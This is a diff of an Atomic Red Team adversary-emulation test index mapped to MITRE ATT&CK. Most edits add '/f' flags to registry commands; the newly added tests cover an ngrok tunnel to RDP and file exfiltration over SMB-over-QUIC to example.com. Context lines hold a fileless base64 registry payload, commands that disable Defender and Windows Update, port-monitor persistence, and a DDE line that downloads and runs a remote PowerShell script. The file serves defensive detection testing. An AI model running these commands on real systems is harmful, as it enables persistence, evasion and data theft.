@@ -2700,7 +2700,7 @@ Invoke-DownloadCradle is used to generate Network and Endpoint artifacts.
 T1059.001,Command and Scripting Interpreter: PowerShell,PowerShell Fileless Script Execution,fa050f5e-bc75-4230-af73-b6fd7852cd73,"Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open ""C:\Windows\Temp"" and verify that
 art-marker.txt is in the folder.
 ",windows,,,"# Encoded payload in next command is the following ""Set-Content -path ""$env:SystemRoot/Temp/art-marker.txt"" -value ""Hello from the Atomic Red Team""""
-reg.exe add ""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=""
+reg.exe add ""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="" /f
 iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
 ",powershell,,,"Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
 Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
@@ -3269,7 +3269,7 @@ input_arguments.working_dir.type: string
 input_arguments.working_dir.default: $env:TEMP
 
 "
-T1547.010,Boot or Logon Autostart Execution: Port Monitors,Add Port Monitor persistence in Registry,d34ef297-f178-4462-871e-9ce618d44e50,Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.,windows,,,"reg add ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /v ""Driver"" /d ""#{monitor_dll}"" /t REG_SZ
+T1547.010,Boot or Logon Autostart Execution: Port Monitors,Add Port Monitor persistence in Registry,d34ef297-f178-4462-871e-9ce618d44e50,Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.,windows,,,"reg add ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /v ""Driver"" /d ""#{monitor_dll}"" /t REG_SZ /f
 ",command_prompt,True,,"reg delete ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /f >nul 2>&1
 ",,,"input_arguments.monitor_dll.description: Addition to port monitor registry key. Normally refers to a DLL name in C:\Windows\System32 but an arbitrary DLL can be specified with the absolute path.
 
@@ -4408,6 +4408,40 @@ input_arguments.domain.description: Default domain to simulate against
 input_arguments.domain.type: string
 
 input_arguments.domain.default: 127.0.0.1.xip.io
+
+"
+T1572,Protocol Tunneling,run ngrok,4cdc9fc7-53fb-4894-9f0c-64836943ea60,"Download and run ngrok. Create tunnel to chosen port.
+",windows,,,"C:\Users\Public\ngrok\ngrok.exe config add-authtoken #{api_token} | Out-Null
+Start-ThreadJob -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp #{port_num} } | Out-Null
+Start-Sleep -s 5 
+Stop-Job -Name Job1 | Out-Null
+",powershell,True,,"Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore
+Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore
+",powershell,"dependencies.0.description: Download ngrok
+
+dependencies.0.prereq_command: if (Test-Path C:\Users\Public\ngrok) {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Path C:\Users\Public\ngrok -ItemType Directory | Out-Null
+Invoke-WebRequest #{download} -OutFile C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip
+Expand-Archive C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\Users\Public\ngrok
+
+","input_arguments.api_token.description: ngrok API
+
+input_arguments.api_token.type: string
+
+input_arguments.api_token.default: N/A
+
+input_arguments.port_num.description: port number for tunnel
+
+input_arguments.port_num.type: integer
+
+input_arguments.port_num.default: 3389
+
+input_arguments.download.description: link to download ngrok
+
+input_arguments.download.type: string
+
+input_arguments.download.default: https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip
 
 "
 T1030,Data Transfer Size Limits,Data Transfer Size Limits,ab936c51-10f4-46ce-9144-e02137b2016a,"Take a file/directory, split it into 5Mb chunks
@@ -6257,7 +6291,7 @@ input_arguments.file_name.default: PathToAtomicsFolder\T1562.002\bin\Phant0m.exe
 
 "
 T1619,Cloud Storage Object Discovery,AWS S3 Enumeration,3c7094f8-71ec-4917-aeb8-a633d7ec4ef5,"This test will enumerate all the S3 buckets in the user account and lists all the files in each bucket. 
-",iaas:azure,,,"for bucket in ""$(aws s3 ls | cut -d "" "" -f3)""; do aws s3api list-objects-v2 --bucket $bucket --output text; done
+",iaas:aws,,,"for bucket in ""$(aws s3 ls | cut -d "" "" -f3)""; do aws s3api list-objects-v2 --bucket $bucket --output text; done
 ",sh,False,,,,"dependencies.0.description: Check if ~/.aws/credentials file has a default stanza is configured
 
 dependencies.0.prereq_command: cat ~/.aws/credentials | grep ""default""
@@ -8452,7 +8486,7 @@ input_arguments.command_to_execute.default: %windir%\System32\calc.exe
 
 "
 T1574.011,Hijack Execution Flow: Services Registry Permissions Weakness,Service Registry Permissions Weakness,f7536d63-7fd4-466f-89da-7e48d550752a,"Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.
-reg add ""HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"" /v ImagePath /d ""C:\temp\AtomicRedteam.exe""
+reg add ""HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"" /f /v ImagePath /d ""C:\temp\AtomicRedteam.exe""
 ",windows,,,"get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
 get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
 ",powershell,,,,,,"input_arguments.weak_service_name.description: weak service check
@@ -8737,7 +8771,7 @@ input_arguments.domain_controller.default: adVM
 
 "
 T1552,Unsecured Credentials,AWS - Retrieve EC2 Password Data using stratus,a21118de-b11e-4ebd-b655-42f11142df0c,"This atomic runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/
-",linux,macos,,"export AWS_REGION=#{aws_region} 
+",linux,macos,iaas:aws,"export AWS_REGION=#{aws_region} 
 cd #{stratus_path}
 echo ""starting warmup""
 ./stratus warmup aws.credential-access.ec2-get-password-data
@@ -14704,9 +14738,9 @@ input_arguments.NEW_Remote_Port.default: 4489
 
 "
 T1021.001,Remote Services: Remote Desktop Protocol,Changing RDP Port to Non Standard Port via Command_Prompt,74ace21e-a31c-4f7d-b540-53e4eb6d1f73,"Changing RDP Port to Non Standard Port via Command_Prompt
-",windows,,,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} -f
+",windows,,,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f
 netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
-",command_prompt,True,,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} -f >nul 2>&1
+",command_prompt,True,,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} /f >nul 2>&1
 netsh advfirewall firewall delete rule name=""RDPPORTLatest-TCP-In"" >nul 2>&1
 net stop TermService >nul 2>&1
 net start TermService >nul 2>&1
@@ -16537,7 +16571,7 @@ See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d
 T1112,Modify Registry,Activate Windows NoPropertiesMyDocuments Group Policy Feature,20fc9daa-bd48-4325-9aff-81b967a84b1d,"Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from ""My Documents icon"" Group Policy. 
 Take note that some Group Policy changes might require a restart to take effect.
 See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
-",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 
+",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f
 ",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /f >nul 2>&1
 ",,,
 T1112,Modify Registry,Hide Windows Clock Group Policy Feature,8023db1e-ad06-4966-934b-b6a0ae52689e,"Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. 
@@ -16703,30 +16737,30 @@ T1112,Modify Registry,Enabling Remote Desktop Protocol via Remote Registry,e3ad8
 ",command_prompt,True,,"reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 2 /f
 ",,,
 T1112,Modify Registry,Disable Win Defender Notification,12e03af7-79f9-4f95-af48-d3f12f28a260,"Disable Win Defender Notification. Redline is using this to disable this win defender feature.
-",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1
-",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 0
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1 /f
+",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 0 /f
 ",,,
 T1112,Modify Registry,Disable Windows OS Auto Update,01b20ca8-c7a3-4d86-af59-059f15ed5474,"Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.
-",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1
-",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 0
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1 /f
+",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 0 /f
 ",,,
 T1112,Modify Registry,Disable Windows Auto Reboot for current logon user,396f997b-c5f8-4a96-bb2c-3c8795cf459d,"Disable Windows Auto Reboot for current logon user. Redline is using this as part of its defense evasion.
-",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoRebootWithLoggedOnUsers"" /t REG_DWORD /d 1
-",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoRebootWithLoggedOnUsers"" /t REG_DWORD /d 0
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoRebootWithLoggedOnUsers"" /t REG_DWORD /d 1 /f
+",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoRebootWithLoggedOnUsers"" /t REG_DWORD /d 0 /f
 ",,,
 T1112,Modify Registry,Windows Auto Update Option to Notify before download,335a6b15-b8d2-4a3f-a973-ad69aa2620d7,"Windows Auto Update Option to Notify before download. Redline is using this as part of its defense evasion.
-",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""AUOptions"" /t REG_DWORD /d 2
-",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""AUOptions"" /t REG_DWORD /d 3
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""AUOptions"" /t REG_DWORD /d 2 /f
+",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""AUOptions"" /t REG_DWORD /d 3 /f
 ",,,
 T1112,Modify Registry,Do Not Connect To Win Update,d1de3767-99c2-4c6c-8c5a-4ba4586474c8,"Do Not Connect To Win Update. Redline is using this as part of its defense evasion.
-",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations"" /t REG_DWORD /d 1
-",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations"" /t REG_DWORD /d 0
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations"" /t REG_DWORD /d 1 /f
+",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations"" /t REG_DWORD /d 0 /f
 ",,,
 T1112,Modify Registry,Tamper Win Defender Protection,3b625eaa-c10d-4635-af96-3eae7d2a2f3c,"Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry. 
 Take note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that 
 tries to tamper this Win Defender feature settings.
-",windows,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0
-",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 5
+",windows,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f
+",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 5 /f
 ",,,
 T1112,Modify Registry,Snake Malware Registry Blob,8318ad20-0488-4a64-98f4-72525a012f6b,"The following Atomic Test creates a registry blob in HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows
 registry that is typically found at HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.
@@ -19351,7 +19385,7 @@ Word VBA Macro
 10. DDEAUTO ""C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\v1.0\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # "" ""Microsoft Document Security Add-On""
 ",,,,
 T1580,Cloud Infrastructure Discovery,AWS - EC2 Enumeration from Cloud Instance,99ee161b-dcb1-4276-8ecb-7cfdcb207820,"This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/
-",linux,macos,,"export AWS_REGION=#{aws_region}
+",linux,macos,iaas:aws,"export AWS_REGION=#{aws_region}
 cd #{stratus_path}
 echo ""Stratus: Start Warmup.""
 ./stratus warmup aws.discovery.ec2-enumerate-from-instance
@@ -20995,6 +21029,46 @@ input_arguments.domain.description: Domain name to search on
 input_arguments.domain.type: string
 
 input_arguments.domain.default: %userdomain%
+
+"
+T1570,Lateral Tool Transfer,Exfiltration Over SMB over QUIC (New-SmbMapping),d8d13303-159e-4f33-89f4-9f07812d016f,"Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.
+Prerequisites:
+  - A file server running Windows Server 2022 Datacenter: Azure Edition
+  - A Windows 11 computer
+  - Windows Admin Center
+",windows,,,"New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck
+copy '#{local_file}' 'Z:\'
+",powershell,True,,,,,"input_arguments.remote_path.description: The UNC path to the share on the file server
+
+input_arguments.remote_path.type: string
+
+input_arguments.remote_path.default: \\example.com\sales
+
+input_arguments.local_file.description: The local file to be transferred
+
+input_arguments.local_file.type: path
+
+input_arguments.local_file.default: C:\path\to\file.txt
+
+"
+T1570,Lateral Tool Transfer,Exfiltration Over SMB over QUIC (NET USE),183235ca-8e6c-422c-88c2-3aa28c4825d9,"Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.
+Prerequisites:
+  - A file server running Windows Server 2022 Datacenter: Azure Edition
+  - A Windows 11 computer
+  - Windows Admin Center
+",windows,,,"NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK
+copy '#{local_file}' '*:\'
+",powershell,True,,,,,"input_arguments.remote_path.description: The UNC path to the share on the file server
+
+input_arguments.remote_path.type: string
+
+input_arguments.remote_path.default: \\example.com\sales
+
+input_arguments.local_file.description: The local file to be transferred
+
+input_arguments.local_file.type: path
+
+input_arguments.local_file.default: C:\path\to\file.txt
 
 "
 T1027.002,Obfuscated Files or Information: Software Packing,Binary simply packed by UPX (linux),11c46cd8-e471-450e-acb8-52a1216ae6a4,"Copies and then runs a simple binary (just outputting ""the cake is a lie""), that was packed by UPX.
@@ -23272,7 +23346,7 @@ input_arguments.password.default: None
 
 "
 T1562.008,Impair Defenses: Disable Cloud Logs,AWS - Disable CloudTrail Logging Through Event Selectors using Stratus,a27418de-bdce-4ebd-b655-38f11142bf0c,"Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/
-",linux,macos,,"export AWS_REGION=#{aws_region} 
+",linux,macos,iaas:aws,"export AWS_REGION=#{aws_region} 
 cd #{stratus_path}
 echo ""starting warmup""
 ./stratus warmup aws.defense-evasion.cloudtrail-event-selectors
@@ -23360,7 +23434,7 @@ input_arguments.aws_region.default: us-west-2
 
 "
 T1562.008,Impair Defenses: Disable Cloud Logs,AWS - Remove VPC Flow Logs using Stratus,93c150f5-ad7b-4ee3-8992-df06dec2ac79,"This Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/
-",linux,macos,,"export AWS_REGION=#{aws_region} 
+",linux,macos,iaas:aws,"export AWS_REGION=#{aws_region} 
 cd #{stratus_path}
 echo ""starting warmup""
 ./stratus warmup aws.defense-evasion.vpc-remove-flow-logs
